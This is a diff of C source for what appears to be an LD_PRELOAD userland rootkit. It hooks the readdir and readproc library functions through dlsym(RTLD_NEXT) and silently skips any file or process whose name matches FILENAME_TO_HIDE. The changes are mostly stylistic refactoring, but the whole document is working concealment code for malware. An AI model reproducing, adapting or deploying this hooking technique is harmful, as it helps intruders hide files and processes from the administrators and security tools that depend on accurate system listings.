@@ -7,7 +7,7 @@
 
 #define FREEPROC(proc) do                                \
 	               {                                 \
-                           if (NULL != (proc))           \
+                           if ((proc) != NULL)           \
 			   {                             \
 			       freeproc(proc);           \
 		               (proc) = NULL;            \
@@ -33,64 +33,47 @@ readdir(DIR* dirp)
     struct dirent* ret = NULL;
 
     // Validate original function exists
-    if (NULL == g_original_readdir)
-    {
+    if (g_original_readdir == NULL) {
         g_original_readdir = dlsym(RTLD_NEXT, "readdir");
-        if (NULL == g_original_readdir)
-	{
-            goto cleanup;
-        }
+        if (g_original_readdir == NULL)
+	    return ret;
     }
 
     // Invoke and skip directory entries to hide
-    do
-    {
-        ret = g_original_readdir(dirp);
-	if (NULL == ret)
-	{
-            goto cleanup;
-	}
+    while ((ret = g_original_readdir(dirp)) != NULL) {
+         if (strstr(ret->d_name, FILENAME_TO_HIDE))
+	    continue;
+	return ret;
     }
-    while (NULL != strstr(ret->d_name, FILENAME_TO_HIDE));
 
-cleanup:
-
-    // Return the entry
+    // readdir returns NULL when no entries left
     return ret;
 }
 
+/* will fix when have the time */
 proc_t*
 readproc(PROCTAB* PT, proc_t* return_buf)
 {
     struct proc_t* ret = NULL;
 
     // Validate original function exists
-    if (NULL == g_original_readproc)
-    {
+    if (g_original_readproc == NULL) {
         g_original_readproc = dlsym(RTLD_NEXT, "readproc");
-	if (NULL == g_original_readproc)
-	{
-            goto cleanup;
-	}
+	if (!g_original_readproc)
+            return ret;
     }
 
     // Invoke and skip process entries to hide
-    do
-    {
+    do {
 	// Free previously system-allocated buffers if required
-        if (NULL == return_buf)
-	{
+        if (return_buf == NULL)
             FREEPROC(ret);
-	}
-
+	
         ret = g_original_readproc(PT, return_buf);
-        if (NULL == ret)
-	{
-            goto cleanup;
-	}
+        if (ret == NULL)
+            return ret;
+	
     } while ((ret->cmdline[0] != NULL) && (NULL != strstr(ret->cmdline[0], FILENAME_TO_HIDE)));
-
-cleanup:
 
     // Return the entry
     return ret;
